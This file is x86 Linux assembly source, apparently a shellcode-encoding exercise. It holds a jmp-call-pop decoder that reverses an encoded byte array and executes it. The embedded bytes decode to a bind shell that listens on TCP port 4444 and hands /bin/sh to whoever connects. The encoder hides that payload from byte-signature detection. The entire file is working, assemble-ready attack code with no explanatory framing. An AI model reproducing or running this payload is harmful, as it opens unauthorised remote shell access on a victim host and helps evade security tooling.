global _start   

section .text
_start:

 jmp short call_shellcode

decoder:
 pop esi	;pointer to shellcode
 push esi	;save pointer for later use

 xor eax, eax	;clear first, XOR-operand register
 xor ebx, ebx	;clear first, XOR-operand register
 xor ecx, ecx	;clear first, XOR-operand register
 xor edx, edx	;clear first, XOR-operand register

 mov cl,len	;set ECX counter to length of code, this will be decreased by one by "loop" command
; mov cl,0x60	;length=96=0x60
 mov edx,ecx	;save length of code into edx
 dec edx	;adjust for the loop (-1)
 shr ecx,1	;divide ecx by 2^1, so counter will not step over the half of the code

myloop:
 mov al, byte [esi]		;get first byte from the encoded shellcode ; maybe xchg is better
 mov ah, byte [esi+edx]		;get last  byte from the encoded shellcode ; maybe xchg is better
 mov byte [esi], ah		;put first byte to the last position in shellcode
 mov byte [esi+edx], al		;put last byte to the first position in shellcode
 sub edx,2			;decrease the pointer to the last byte by 2
 inc esi			;increase starting pointer

 loop myloop		;repeat and decrease ecx by 1

 jmp short Shellcode

call_shellcode:

 call decoder
 Shellcode: db 0x80,0xcd,0x0b,0xb0,0xe2,0x89,0x50,0xe1,0x89,0x50,0xe3,0x89,0x6e,0x69,0x62,0x2f,0x68,0x68,0x73,0x2f,0x2f,0x68,0x50,0xc0,0x31,0xf9,0x79,0x49,0x80,0xcd,0x3f,0xb0,0x02,0xb1,0x59,0x93,0x80,0xcd,0xe1,0x89,0x56,0x52,0x52,0x05,0xb3,0x66,0xb0,0x80,0xcd,0xe1,0x89,0x56,0x53,0x04,0xb3,0x66,0xb0,0x80,0xcd,0xe1,0x89,0x56,0x51,0x10,0x6a,0xe1,0x89,0x53,0x66,0x5c,0x11,0x68,0x66,0x52,0xd2,0x31,0x5b,0x66,0xb0,0xc6,0x89,0x80,0xcd,0xe1,0x89,0x02,0x6a,0x53,0x43,0x53,0xdb,0x31,0x66,0xb0,0xc0,0x31
 len:    equ $-Shellcode
